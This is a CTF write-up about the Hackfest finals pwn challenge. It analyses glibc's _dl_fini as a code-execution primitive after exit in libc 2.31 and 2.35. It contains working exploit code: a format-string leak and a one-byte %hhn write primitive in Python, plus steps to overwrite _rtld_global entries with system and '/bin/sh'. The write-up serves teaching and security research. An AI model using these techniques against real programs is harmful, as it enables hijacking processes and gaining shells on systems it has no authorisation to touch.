# Hackfest Finals CTF

[Hackfest](https://hackfest.tn/) is a local CTF competition, this year is the 7th edition. After securing the first place in qualification CTF, we participated & secured the first place again in the finals under the team PCP_F0rt.

I wouldn't consider this a writeup, it's more of an analysis of an interesting function, `_dl_fini`. More details can be found below. We'll start with the challenge in order to get more context.

Note: Libc 2.31 is used for this. [Last section](#Libc-235) will talk about exploitation in libc 2.35

### big boi warmup (pwn)

A simple binary, not much to look into:

<p align="center">
    <img src="/2023/Hackfest%20Finals/imgs/main.png"><br/>
</p>

Binary protection:

<p align="center">
    <img src="/2023/Hackfest%20Finals/imgs/checksec.png"><br/>
</p>

Okay, the `filter` function checks for `$`, couldn't think of a way to bypass so, we can't use it. This won't be much of a problem since we can write a pretty much long payload (0x500). We also have a "maximum of 2 loops", in which our payload will be passed to `printf` as a format.

Plan:
- We leak everything we can (Libc, pie, stack) using the first iteration.
- We'll target the counter variable located in stack. The counter is of type `int` therefore, if we write 1 to the MSB, it'll become negative. We get an infinite format strings. We send many `%p` with our target write address at the end of the payload & we find out which of them gets the address value, replace it with `%n`. We have a write primitive. However! the number of bytes printed is going to be a mess therefore, the value written is a mess too.

#### Crafting a write primitive

Now, we can write but controlling what we'll write is a mess. It's possible to make a write primitive but it'll require lot of alignments & paddings (AND DEBUGGING) therefore, I went for a simple one byte write primitive.

Plan is simple, in order to fix our padding, we'll guarantee a 256 bytes in the payload in which we are free to control, doesn't have to be consecutive. We start by keeping them after our `%hhn` (hhn in order to write 1 byte). Then we check how much we are writing as a default value & write a function to calculate how many bytes are needed to reach our target value. Which is the following line:

```python
b = (112-7 + data)%256
```

Then we can use the new value to correctly pad our payload. The write primitive is the following:

```python
def writeByteInAdr(adr, data):
    b = (112-7 + data)%256
    
    ps = [b"%p"]*55
    ps[54] = b"%hhn"
    payload = b"." * b
    payload += b"".join(ps)
    payload += b"."*(256 - b)
    payload += b"."*8 # Padding
    payload += p64(adr)
    payload += p64(0xcafebabe)
    
    sendl(payload)
```

Great, now we can write. The first thing to do is to write the MSB of our counter in order to turn it into a negative value.

```python
    r = conn()
    
    payload = b"%p."*178
    
    sendl(payload)
    
    r.readline()
    leak = r.readline().decode().split(".")
    
    stack_leak, libc_leak, pie_leak, ld_base = int(leak[0], 16), int(leak[5], 16), int(leak[-2], 16), int(leak[4], 16)-0x11d60
    logh("stack_leak", stack_leak)
    logh("libc_leak", libc_leak)
    logh("pie_leak", pie_leak)
    logh("ld_base", ld_base)
    
    libc_base = libc_leak - 0x11ea0 # 0x205d60
    pie_base = pie_leak - 0x1120
    counter = stack_leak + 0xc - 0x10
    logh("libc_base", libc_base)
    logh("pie_base", pie_base)
    logh("counter adr", counter)

    ...

    writeByteInAdr(counter+3, 0xf0)
```

Now we have an infinity of writes. The question now is, where to write? And what to write?

The intended solution was causing a buffer overflow in printf function, which means we'll be writing to the stack (probably) & result in a ROP chain. However, I had something more interesting.

During the CTF, I found an interesting call primitive (More than one actually) which executes after calling the `exit(0)`. So, I wanted to dig more into that.

The instruction was calling an address of a function written in a writeable memory address:

```assembly
call   QWORD PTR [r14]
```

During the CTF, I didn't dig into the source of this instruction, I only debugged the execution in order to figure out what's needed to control that.

Now it's time to dive.

#### The end of execution

What happens at the end of execution of a binary? Let's consider the following C code

```c
#include<stdio.h>

int main(){
    char x[50];
    read(0, x, 40);
    return 0;
}
```

Nothing much fancy here, a simple main function that does nothing & returns. Now, what happens when we return?

If we dive into the source code of libc, we can see in `sysdeps/unix/sysv/linux/powerpc/libc-start.c` that the function `libc_start_main` calls a `generic_start_main`, which is defined above as 

```c
#define LIBC_START_MAIN generic_start_main
```

The `LIBC_START_MAIN` function does 3 interesting things:
- Registers an exit handler
- Call main function
- Calls exit

You can examine the definition in `csu/libc-start.c`.

Code:

```c
STATIC int
LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL),
		 int argc, char **argv,
#ifdef LIBC_START_MAIN_AUXVEC_ARG
		 ElfW(auxv_t) *auxvec,
#endif
		 __typeof (main) init,
		 void (*fini) (void),
		 void (*rtld_fini) (void), void *stack_end)
{
  /* Result of the 'main' function.  */
  int result;

  ...

  /* Register the destructor of the dynamic linker if there is any.  */
  if (__glibc_likely (rtld_fini != NULL))
    __cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);
  
  ...

    if (__glibc_likely (! not_first_call))
    {
      ...

      /* Run the program.  */
      result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);
    }
  else

  ...

  exit (result);
}
```

So, the normal termination of a program is still made by calling `exit`.

Now, what does `exit` do?

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

This is the code for `exit` function. It's a simple trampoline function that'll call `__run_exit_handlers`. Now the name of this function is clear enough, if you're not familliar with exit handlers, those are function called at the end of the execution in order to do some cleanups. You can register handlers using the `atexit` function.

The exit handlers are stored in a linked list, it contains the address of the function to be executed however, as a security precaution, the pointer to the function is mangled. This isn't our target today, we used this in qualification so now, we move on.

Back to the `LIBC_START_MAIN`. We had a function registered as an exit handler, remember? What's this function?

We can either debug the execution or examine the glibc source. The function registered is `_dl_fini`. It's responsible for cleaning up objects. The function is stored in the dynamic loader `ld.so`.

Now we've reached the jucy part, at the end of the execution, `_dl_fini` will be called. I wonder if there's a case in which `_dl_fini` won't be called? I can't confirm that yet so, If someone can confirm this I'd love to know.

We jump into `_dl_fini`!

#### Analyzing _dl_fini

Okay, to start, in order to see why this function is interesting, I'd like to jump into the assembly code before reading the source. I'll keep only the interesting parts:

```assembly
   0x0000000000011d60 <+0>:	endbr64 
   0x0000000000011d64 <+4>:	push   rbp
   0x0000000000011d65 <+5>:	mov    rbp,rsp

   ...

   0x0000000000011da8 <+72>:	lea    rdi,[rip+0x1cbb9]        # 0x2e968 <_rtld_global+2312>
   0x0000000000011daf <+79>:	call   QWORD PTR [rip+0x1d1bb]        # 0x2ef70 <_rtld_global+3856>
   0x0000000000011db5 <+85>:	sub    r12,0x1
   0x0000000000011db9 <+89>:	sub    rbx,0x90
   0x0000000000011dc0 <+96>:	cmp    r12,0xffffffffffffffff
   0x0000000000011dc4 <+100>:	je     0x12050 <_dl_fini+752>
   0x0000000000011dca <+106>:	lea    rdi,[rip+0x1cb97]        # 0x2e968 <_rtld_global+2312>
   0x0000000000011dd1 <+113>:	call   QWORD PTR [rip+0x1d191]        # 0x2ef68 <_rtld_global+3848>
   
   ...
   
   0x0000000000011ece <+366>:	xor    edx,edx
   0x0000000000011ed0 <+368>:	mov    ecx,0x1
   0x0000000000011ed5 <+373>:	call   0x19290 <_dl_sort_maps>
   0x0000000000011eda <+378>:	lea    rdi,[rip+0x1ca87]        # 0x2e968 <_rtld_global+2312>
   0x0000000000011ee1 <+385>:	call   QWORD PTR [rip+0x1d089]        # 0x2ef70 <_rtld_global+3856>
   
   ... (rdi didn't change)
   
   0x0000000000011f61 <+513>:	je     0x11f78 <_dl_fini+536>
   0x0000000000011f63 <+515>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000011f68 <+520>:	call   QWORD PTR [r14]
   
   ...
   
   0x0000000000011f78 <+536>:	mov    rax,QWORD PTR [r15+0xa8]
   0x0000000000011f7f <+543>:	test   rax,rax
   0x0000000000011f82 <+546>:	je     0x11f8d <_dl_fini+557>
   0x0000000000011f84 <+548>:	mov    rax,QWORD PTR [rax+0x8]
   0x0000000000011f88 <+552>:	add    rax,QWORD PTR [r15]
   0x0000000000011f8b <+555>:	call   rax
   
   ...
   
   0x000000000001207d <+797>:	pop    r15
   0x000000000001207f <+799>:	pop    rbp
   0x0000000000012080 <+800>:	ret
```

Now, that's lot of pointers and lot of calls. What makes things better, these calls are in writeable memory areas! Not only that! We have our rdi register pointing to a writeable memory area too!

Personally, I'd take this as an invitation to write whatever function you want to call with a free parameter too.

Now, we examine each of those calls in the source code. Starting off with `_dl_fini+113`:

```assembly
   0x7f055f11ddca <_dl_fini+106>   lea    rdi, [rip+0x1cb97]        # 0x7f055f13a968 <_rtld_global+2312>
 → 0x7f055f11ddd1 <_dl_fini+113>   call   QWORD PTR [rip+0x1d191]        # 0x7f055f13af68 <_rtld_global+3848>
```

We are using `_rtld_global` structure to load our pointers. The good part is that this structure is stored in a read/write memory. This call is 

```c
void
_dl_fini (void)
{
  ...

  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock)); // <------------------ call QWORD PTR [rip+0x1d191]

```

So, we can simply go for overwriting the following memory addresses:
- _rtld_global+2312: Write "/bin/sh".
- _rtld_global+3848: Write `system` address.

Next:

```c
    __rtld_lock_lock_recursive (GL(dl_load_lock)); // <------------------ call QWORD PTR [rip+0x1d191]

    ...

    if (nloaded == 0)
      __rtld_lock_unlock_recursive (GL(dl_load_lock));
    else
	{
	  ...

	  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
        ...
	    _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),
	  		 NULL, true);

	    __rtld_lock_unlock_recursive (GL(dl_load_lock)); // <----------------------- call   QWORD PTR [rip+0x1d089]
```

There is a check on `nloaded`. However, `__rtld_lock_unlock_recursive` is called in both cases. So, that's our second gadget! Which is the following assembly code:

```assembly
0x0000000000011eda <+378>:	lea    rdi,[rip+0x1ca87]        # 0x2e968 <_rtld_global+2312>
0x0000000000011ee1 <+385>:	call   QWORD PTR [rip+0x1d089]        # 0x2ef70 <_rtld_global+3856>
```

<p align="center">
    <img src="/2023/Hackfest%20Finals/imgs/call.png"><br/>
</p>

<p align="center">
    <img src="/2023/Hackfest%20Finals/imgs/param.png"><br/>
</p>

Addresses used:
- _rtld_global+2312: Same as before (rdi).
- _rtld_global+3856: A new address pointer.

Next!

```assembly
0x0000000000011f68 <+520>:	call   QWORD PTR [r14]
```

Now, this is the gadget I've used in my solver. We have the same value for rdi. However, we are calling the function `r14` is pointing to.

This call is caused by this piece of code:

```c
while (i-- > 0)
    ((fini_t) array[i]) ();
```

Okay, we backtrace this piece of code. This can be a bit messy:

```c
_dl_fini (void)
{
  ...
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
  {
    /* Protect against concurrent loads and unloads.  */
    __rtld_lock_lock_recursive (GL(dl_load_lock));

    unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
    /* No need to do anything for empty namespaces or those used for
    auditing DSOs.  */
    if (nloaded == 0)
	  __rtld_lock_unlock_recursive (GL(dl_load_lock));
    else
	{
	  /* Now we can allocate an array to hold all the pointers and
	     copy the pointers in.  */
	  struct link_map *maps[nloaded];

	  unsigned int i;
	  struct link_map *l;
	  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
	  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
	    /* Do not handle ld.so in secondary namespaces.  */
	    if (l == l->l_real)
        {
		  assert (i < nloaded);

		  maps[i] = l;
		  l->l_idx = i;
		  ++i;

		  /* Bump l_direct_opencount of all objects so that they
		   are not dlclose()ed from underneath us.  */
		  ++l->l_direct_opencount;
        }
	  assert (ns != LM_ID_BASE || i == nloaded);
	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
	  unsigned int nmaps = i;

	  /* Now we have to do the sorting.  We can skip looking for the
	     binary itself which is at the front of the search list for
	     the main namespace.  */
	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),
			 NULL, true);

	  /* We do not rely on the linked list of loaded object anymore
	     from this point on.  We have our own list here (maps).  The
	     various members of this list cannot vanish since the open
	     count is too high and will be decremented in this loop.  So
	     we release the lock so that some code which might be called
	     from a destructor can directly or indirectly access the
	     lock.  */
	  __rtld_lock_unlock_recursive (GL(dl_load_lock));

	  /* 'maps' now contains the objects in the right order.  Now
	     call the destructors.  We have to process this array from
	     the front.  */
	  for (i = 0; i < nmaps; ++i)
	    {
	      struct link_map *l = maps[i];

	      if (l->l_init_called)
		{
		  /* Make sure nothing happens if we are called twice.  */
		  l->l_init_called = 0;

		  /* Is there a destructor function?  */
		  if (l->l_info[DT_FINI_ARRAY] != NULL
		      || l->l_info[DT_FINI] != NULL)
		    {
		      /* When debugging print a message first.  */
		      if (__builtin_expect (GLRO(dl_debug_mask)
					    & DL_DEBUG_IMPCALLS, 0))
			_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
					  DSO_FILENAME (l->l_name),
					  ns);

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}
```

Okay, to understand this code, we start by viewing our `rtld_global` struct:

```c
struct rtld_global
{
    ...

    /* A pointer to the map for the main map.  */
    struct link_map *_ns_loaded;
    /* Number of object in the _dl_loaded list.  */
    unsigned int _ns_nloaded;

    ...
```

this should be enough for now. 

Now the first check

```c
unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
if (nloaded == 0)
  __rtld_lock_unlock_recursive (GL(dl_load_lock));
else
{
```

is checking the value of `_ns_nloaded`. As far as I checked, this will be at least 1. Checking the startup process [here](https://www.gnu.org/software/hurd/glibc/startup.html), we see that `dl_main` is called during the startup (**DYNAMICALLY** linked binaries only). And examining this function, we have :

```c
++GL(dl_ns)[LM_ID_BASE]._ns_nloaded;
```

which is going to increment that. That line is deep in the function but there are no conditions to control it's execution so, it'll always be executed. (If I'm wrong, please update me)

Now, we are in the else.

```c
/* Now we can allocate an array to hold all the pointers and
    copy the pointers in.  */
struct link_map *maps[nloaded];

unsigned int i;
struct link_map *l;
```

Some declarations, we check the `link_map` structure, Full definition can be found at `include/link.h`:

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */

    ... 

     /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
  };
```

Now, the `l_addr` is the interesting one, the comment might be not so clear so let me explain. In our case, that'll represent the base address of the binary. If PIE is disabled, it'll be NULL (Value 0).

The rest we don't need much for now. 

Note: If you haven't noticed, this `link_map` structure is the same one as the one used by dl resolver (A good ref on [dl resolve attack](https://syst3mfailure.io/ret2dl_resolve/) incase you're curious enough).

Proceeding, it'll be saving the linked list elements in an array `maps` and then, for each object, it'll call it's destructor functions.

The way the destructor address is calculated is our attack point here:

```c
ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
```

What this does is, it takes the base address & adds an offset stored in the binary. Incase PIE is disabled, the offset is the address itself & the base is 0. Well, the base address is writeable so, we can change that! We only have to consider the offset that'll be added.

And rdi is still pointing to the same writeable memory address so we can use that.

So, we can control the value of `r14` however, we'll need to control the value stored at the address it'll be pointing to! We are calling it as a pointer remember? So for this one, we'll need an extra write.

The next call gadget uses the binary's base so, it won't be much of use because it'll either crash (or do something unexpected) the call before it since both of them require the binary's base address.

#### One more!

Finally, one possible attack vector would be faking the `link_map` structure. Since `_rtld_global` is writeable, we can overwrite the head pointer stored in there. However, this will require more writes.

#### So, how good is this? Conclusion

In order to exploit this function, we'll need:
- Libc/Ld leak. We can get a libc leak then find the offset to reach ld base. This can be bruteforced or checked directly from Docker if it was given.
- 2/3 writes are necessary: `system` address + "/bin/sh" (Or "sh" if you want to save up bytes, system uses the environment variable PATH). If the registers at a certain call are suitable for a one gadget, only 1 write will be needed.
- Program must end execution eventually. Either via `exit` or via returning from `main`. (No infinite loops, no `_exit` calls)

Compared to abusing exit handlers, we don't have to leak a pointer guard so, that's less reading (which may not always be possible?)

This also gives the possibility to chain up calls if needed however, we are very limited with parameters. (Only 1 parameter & the value is passed to all of the calls)

Personally, if I'll ever have to exploit an exit handler to control the execution, I'd rather go for this.

# Libc 2.35

Now, there are 2 main changes that we'll talk about here:
- Both `__rtld_lock_lock_recursive` & `__rtld_lock_unlock_recursive` are read only.
- A change in lock mechanism.

So? What do we have now? We still have the last call gadget however there is a problem. If we would try simply overwriting the value pointed by `rdi`, the process would hang. Now if we go back to `_dl_fini`, the first argument passed to `__rtld_lock_lock_recursive` is a mutex. This call actually takes us to `pthread_mutex_lock` function, which is the following:

```c
int
PTHREAD_MUTEX_LOCK (pthread_mutex_t *mutex)
{
  /* See concurrency notes regarding mutex type which is loaded from __kind
     in struct __pthread_mutex_s in sysdeps/nptl/bits/thread-shared-types.h.  */
  unsigned int type = PTHREAD_MUTEX_TYPE_ELISION (mutex);

  LIBC_PROBE (mutex_entry, 1, mutex);

  if (__builtin_expect (type & ~(PTHREAD_MUTEX_KIND_MASK_NP
				 | PTHREAD_MUTEX_ELISION_FLAGS_NP), 0))
    return __pthread_mutex_lock_full (mutex);

  if (__glibc_likely (type == PTHREAD_MUTEX_TIMED_NP))
    {
      FORCE_ELISION (mutex, goto elision);
    simple:
      /* Normal mutex.  */
      LLL_MUTEX_LOCK_OPTIMIZED (mutex);
  
  ...
```

Now, this method is causing the process to hang & the reason is, when we write our "/bin/sh" into the memory address pointed by `rdi`, the mutex's value changes. If we examine the type of the mutex in `rtld_global` struct:

```c
struct rtld_global
{
  ...
  /* During the program run we must not modify the global data of
     loaded shared object simultanously in two threads.  Therefore we
     protect `_dl_open' and `_dl_close' in dl-close.c.

     This must be a recursive lock since the initializer function of
     the loaded object might as well require a call to this function.
     At this time it is not anymore a problem to modify the tables.  */
  __rtld_lock_define_recursive (EXTERN, _dl_load_lock)
  ...
}
```

Checking man pages to get more info on this mutex type:

>(In the case of PTHREAD_MUTEX_RECURSIVE mutexes, the mutex shall
>become available when the count reaches zero and the calling
>thread no longer has any locks on this mutex.)

So, if the value is no longer 0 therefore, the mutex taken "by someone else". That's why the process hanged. It was simply waiting for the mutex to be freed.

I immediately thought of changing the type of the mutex but how? and to what?

- How? `rdi` is pointing at `_rtld_global+2568`. The type is stored at `_rtld_global+2568+0x10`
- To what?

Well, first thing I tried was setting the number of mutex type to 0xffffffff & I found myself in `__pthread_mutex_lock_full` function. This function didn't hang the process & successfully returned! So how do we reach?

```c
unsigned int type = PTHREAD_MUTEX_TYPE_ELISION (mutex);

if (__builtin_expect (type & ~(PTHREAD_MUTEX_KIND_MASK_NP
				 | PTHREAD_MUTEX_ELISION_FLAGS_NP), 0))
    return __pthread_mutex_lock_full (mutex);
```

the variable `type` is going to be the number stored at `_rtld_global+2568+0x10`. I'll quickly explain `__builtin_expect`: This is used for compiler optimisation, it should tell that the expected value for that expression is 0 most of the time, so optimise the code with that in consideration.

Now this is the condition to call `__pthread_mutex_lock_full`:

```c
type & ~(PTHREAD_MUTEX_KIND_MASK_NP | PTHREAD_MUTEX_ELISION_FLAGS_NP
```

And we have:

```c
PTHREAD_MUTEX_KIND_MASK_NP      = 3
PTHREAD_MUTEX_ELISION_FLAGS_NP  = PTHREAD_MUTEX_ELISION_NP | PTHREAD_MUTEX_NO_ELISION_NP
PTHREAD_MUTEX_ELISION_NP        = 256
PTHREAD_MUTEX_NO_ELISION_NP     = 512
```

You can get that from the source code. Those are constants.

So, that leaves us with

```c
type & 0xfc
```

Any value that gives a non zero there will result in calling `__pthread_mutex_lock_full`. Now, we have a switch case with 3 main code blocks. I didn't dive into these however, I tried a couple of values (0x4, 0xffffffff) so I moved on! With this, we can then change the value of `_rtld_global+2568` to "/bin/sh", pick an address to store the address of `system`. Calculate our new offset & overwrite the binary base.

For reference, I've included a solver for `pwn/Robots revenge` in which I used this technique. The dockerfile includes a setup to debug the execution. During the CTF, I had an arbitrary write but didn't have enough time to gather the proper offsets in the dynamic loader to pop the shell, plus I wasn't aware of the mutex problem at that time so, I'm glad I got back to this & despite this being an unintended solution, this was a lot of fun!

I'm looking forward for more stuff like this!
